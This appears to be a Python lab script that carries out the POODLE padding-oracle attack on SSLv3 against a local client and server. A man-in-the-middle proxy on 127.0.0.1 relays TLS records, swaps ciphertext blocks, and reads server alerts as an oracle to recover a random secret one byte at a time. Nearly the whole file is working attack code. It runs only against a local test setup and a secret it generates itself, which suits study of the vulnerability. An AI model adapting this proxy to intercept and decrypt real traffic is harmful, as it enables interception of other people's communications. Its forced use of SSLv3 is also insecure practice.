###############################################################
#The Testing of Proxy server and client are done below
#Threads are written in program
###############################################################
import Crypto
import sys
sys.modules['crypto'] = Crypto
from crypto import Random
from crypto.Random import random
import ssl
import socket
import struct
import threading
import select
import socketserver
import os
###############################################################
#Important Function for string to bytestring conversion
def getbytestr(inp):
	'''This function returns the byte array for the given input string inp'''
	raw_str = list(map(ord,inp))
	return bytes(raw_str)
#############################################################################
def senddata(str_i):
	p_rootsock = socket.socket()
	p_rootsock = socket.create_connection(("127.0.0.1",6001))
	p_rootsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	rootsock = ssl.wrap_socket(sock=p_rootsock,ca_certs="cacert.pem",cert_reqs=ssl.CERT_REQUIRED,ssl_version=ssl.PROTOCOL_SSLv3)
	#print(repr(rootsock.getpeername()))
	#print(rootsock.cipher())
	#print(pprint.pformat(rootsock.getpeercert()))
	th1 = readt(rootsock,str_i)
	th2 = writet(rootsock)
	th1.start()
	th2.start()
	th1.join()
	th2.join()
class POODLE():
	def __init__(self):
		self.block_size = None
		self.block_fill = None
		self.current_len = None
		self.original_len = None
		self.startyet = False
		self.current_block = None
		self.current_byte = None
		self.data = None
		self.is_success = False
		self.rstr = Random.new().read(random.choice(range(5,20)))
		print(getbytestr("Original String is - ")+self.rstr)
		#self.rstr = getbytestr("a")
		self.plaintext = ""
	
	def getblocksize(self):
		senddata(self.rstr)
		self.original_len = self.current_len
		rstr1 = self.rstr
		self.block_fill = 0
		while self.current_len == self.original_len:
			self.block_fill += 1
			rstr1 = getbytestr("A") + rstr1
			senddata(rstr1)
		return self.current_len-self.original_len
	
	def poodle_init(self):
		self.block_size = self.getblocksize()
		self.startyet = True
		todo_length = self.current_len+self.block_size
		for i in range(1,round(todo_length/self.block_size)-2):
			temp = ""
			for j in reversed(range(self.block_size)):
				if i == round(todo_length/self.block_size)-3:
					if j>=12:
						continue
				if i == 1 and j<self.block_fill:
					continue
				self.is_success = False
				plainchar = self.decipher(i,j)
				temp = plainchar + temp
				print(plainchar)
			self.plaintext += temp
		print(getbytestr("The obtained string is - ")+getbytestr(self.plaintext))

	def createstr(self,byte):
		nstr = self.rstr
		for i in range(0,self.block_fill+self.block_size):
			nstr = getbytestr("A") + nstr
		pref = self.block_size - byte - 1
		suff = byte + 1
		for i in range(0,pref):
			nstr = getbytestr("A") + nstr
		for i in range(0,suff):
			nstr = nstr + getbytestr("D")
		return nstr

	def block(self, n):
		return self.data[n*self.block_size:(n+1)*self.block_size]

	def decipher(self,block,byte):
		self.current_block = block
		self.current_byte = byte
		nstr = self.createstr(byte)
		while True:
			senddata(nstr)
			if self.is_success == True:
				self.is_success = False
				return chr((self.block_size-1) ^ self.block(-2)[-1] ^ self.block(self.current_block-1)[-1])
	
	def alter(self,data):
		self.data = data
		data1 = self.data[:-self.block_size] + self.block(self.current_block)
		return data1

poodle = POODLE()
############################New Additions####################################
class mitmserver(socketserver.BaseRequestHandler):
    def handle(self):
    	socketserver.TCPServer.allow_reuse_address = True
    	destination = socket.create_connection(("127.0.0.1",6000))
    	destination.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    	self.request.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    	sockets = [self.request,destination]
    	alterflag = False
    	marker = False
    	while True:
            inp, out, exce = select.select(sockets,[],[])
            for s in inp:
                if s == self.request:
                    ssl_header = s.recv(5)
                    if len(ssl_header) == 0:
                    	return
                    (content_type, version, length) = struct.unpack('>BHH', ssl_header)
                    data = s.recv(length)
                    if len(data)==0:
                        return
                    poodle.current_len = len(data)
                    if content_type == 23:
                    	if poodle.startyet == True and marker == True:
                    		data = poodle.alter(data)
                    		alterflag = True
                    	elif marker == False:
                    		marker = True
                    		alterflag = False
                    destination.send(ssl_header+data)
                elif s == destination:
                    data = s.recv(1048576)
                    if len(data)==0:
                        return
                    if alterflag == True:
                    	(content_type, version, length) = struct.unpack('>BHH',data[:5])
                    	if content_type == 23:
                    		poodle.is_success = True
                    	alterflag = False
                    	if content_type == 21:
                    		poodle.is_success = False
                    		return
                    self.request.send(data)
class mitmt(threading.Thread):
	def __init__(self,tup):
		threading.Thread.__init__(self)
		self.ssl_serverloc = tup
	def run(self):
		socketserver.TCPServer.allow_reuse_address = True
		ssl_server = socketserver.TCPServer(self.ssl_serverloc,mitmserver)
		self.socketi = ssl_server
		ssl_server.serve_forever()

ssl_serverloc = ("127.0.0.1",6001)
mitmto = mitmt(ssl_serverloc)
mitmto.start()
'''
socketserver.TCPServer.allow_reuse_address = True
ssl_server = socketserver.TCPServer(ssl_serverloc,mitmserver)
ssl_server.serve_forever()
'''
################################################################

###############################################################
#Signal Handling
###############################################################
class readt(threading.Thread):
	def __init__(self,sock,str_i):
		threading.Thread.__init__(self)
		self.sock = sock
		self.str_i = str_i
	def run(self):
		#while True:
			#raw_str = input("Input the String: ")
			#if len(rstr) == 0:
				#continue
			self.sock.write(self.str_i)
			#time.sleep(0.1)

class writet(threading.Thread):
	def __init__(self,sock):
		threading.Thread.__init__(self)
		self.sock = sock
	def run(self):
		data = self.sock.read()
		#print(data)
		#while data:
			#print("Received Transmission: "+data.decode("UTF-8"))
			#data = self.sock.read()
#Create more of a client like we do in C program of client and socket
#############################################################################
############################Function Definitions#############################
poodle.poodle_init()
os._exit(0)